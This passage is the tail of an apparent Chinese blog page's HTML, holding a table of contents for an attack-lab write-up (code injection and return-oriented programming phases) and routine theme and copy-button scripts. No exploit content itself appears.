mobile-toc-link transition-color" style=margin-left:0 data-mobile-heading-id=工具><span class="text-sm truncate">工具</span></a></li><li class=my-1><a href=#objdump class="flex items-center rounded-lg hover:bg-base-200 mobile-toc-link transition-color" style=margin-left:12px data-mobile-heading-id=objdump><span class="text-sm truncate">objdump</span></a></li><li class=my-1><a href=#hex2raw class="flex items-center rounded-lg hover:bg-base-200 mobile-toc-link transition-color" style=margin-left:12px data-mobile-heading-id=hex2raw><span class="text-sm truncate">hex2raw</span></a></li><li class=my-1><a href=#gdb class="flex items-center rounded-lg hover:bg-base-200 mobile-toc-link transition-color" style=margin-left:12px data-mobile-heading-id=gdb><span class="text-sm truncate">GDB</span></a></li><li class=my-1><a href=#ctargetcode-injection-attacks class="flex items-center rounded-lg hover:bg-base-200 mobile-toc-link transition-color" style=margin-left:0 data-mobile-heading-id=ctargetcode-injection-attacks><span class="text-sm truncate">ctarget:Code Injection Attacks</span></a></li><li class=my-1><a href=#phase-1 class="flex items-center rounded-lg hover:bg-base-200 mobile-toc-link transition-color" style=margin-left:12px data-mobile-heading-id=phase-1><span class="text-sm truncate">Phase 1</span></a></li><li class=my-1><a href=#phase-2 class="flex items-center rounded-lg hover:bg-base-200 mobile-toc-link transition-color" style=margin-left:12px data-mobile-heading-id=phase-2><span class="text-sm truncate">Phase 2</span></a></li><li class=my-1><a href=#phase-3 class="flex items-center rounded-lg hover:bg-base-200 mobile-toc-link transition-color" style=margin-left:12px data-mobile-heading-id=phase-3><span class="text-sm truncate">Phase 3</span></a></li><li class=my-1><a href=#rtagetreturn-oriented-programming class="flex items-center rounded-lg hover:bg-base-200 mobile-toc-link transition-color" style=margin-left:0 data-mobile-heading-id=rtagetreturn-oriented-programming><span class="text-sm truncate">rtaget:Return-Oriented Programming</span></a></li><li class=my-1><a href=#phase-4 class="flex items-center rounded-lg hover:bg-base-200 mobile-toc-link transition-color" style=margin-left:12px data-mobile-heading-id=phase-4><span class="text-sm truncate">Phase 4</span></a></li><li class=my-1><a href=#phase-5 class="flex items-center rounded-lg hover:bg-base-200 mobile-toc-link transition-color" style=margin-left:12px data-mobile-heading-id=phase-5><span class="text-sm truncate">Phase 5</span></a></li><li class=my-1><a href=#总结 class="flex items-center rounded-lg hover:bg-base-200 mobile-toc-link transition-color" style=margin-left:0 data-mobile-heading-id=总结><span class="text-sm truncate">总结</span></a></li></ul></div></div><form method=dialog class=modal-backdrop><button>close</button></form></dialog><script type=module>document.addEventListener("astro:page-load",(()=>{const e=document.getElementById("mobile-toc-button");if(!e)return;const t=document.querySelectorAll(".mobile-toc-link"),i=document.querySelectorAll("h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]");let o=null;const l=()=>{o||(o=setTimeout((()=>{window.scrollY>300?(e.classList.remove("opacity-0","invisible"),e.classList.add("opacity-100","visible")):(e.classList.remove("opacity-100","visible"),e.classList.add("opacity-0","invisible")),t.length>0&&i.length>0&&s(),o=null}),100))},s=()=>{let e=null;for(let t=i.length-1;t>=0;t--){const o=i[t];if(o.getBoundingClientRect().top<=100){e=o.id;break}}t.forEach((t=>{t.getAttribute("data-mobile-heading-id")===e?t.classList.add("bg-primary/10","font-medium"):t.classList.remove("bg-primary/10","font-medium")}))};window.addEventListener("scroll",l,{passive:!0}),l(),document.addEventListener("astro:before-swap",(()=>{window.removeEventListener("scroll",l),o&&clearTimeout(o)}))}))</script><script>!function(){const t="dracula";document.addEventListener("astro:after-swap",(()=>{const e=localStorage.getItem("theme");if(e){document.documentElement.setAttribute("data-theme",e);const n=e===t?"dark":"light";document.documentElement.setAttribute("data-theme-type",n)}}))}()</script><script>document.addEventListener("astro:page-load",(()=>{document.querySelectorAll(".btn-copy").forEach((e=>{e.addEventListener("click",(async()=>{const o=e.closest(".frosti-code").querySelector("code").textContent,c=e.querySelector(".frosti-code-toolbar-copy-icon"),s=e.querySelector(".frosti-code-toolbar-copy-success");try{await navigator.clipboard.writeText(o),c.classList.add("hidden"),s.classList.remove("hidden"),e.classList.add("copy-success"),setTimeout((()=>{c.classList.remove("hidden"),s.classList.add("hidden"),e.classList.remove("copy-success")}),2e3)}catch(e){console.error("Failed to copy:",e)}}))}))}))</script><style>.btn-copy{position:relative;overflow:hidden}.copy-success{animation:pulse .5s ease-in-out}.frosti-code-toolbar-copy-success svg{color:#10b981}@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.1)}100%{transform:scale(1)}}</style></body></html>